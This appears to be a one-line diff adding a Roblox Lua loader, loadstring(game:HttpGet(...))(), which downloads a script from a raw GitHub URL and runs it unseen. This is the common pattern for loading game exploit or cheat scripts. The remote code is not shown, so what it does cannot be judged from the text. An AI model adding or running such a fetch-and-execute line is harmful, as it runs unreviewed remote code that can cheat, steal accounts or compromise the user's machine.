@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Yatalog/1/refs/heads/main/Myscript"))()
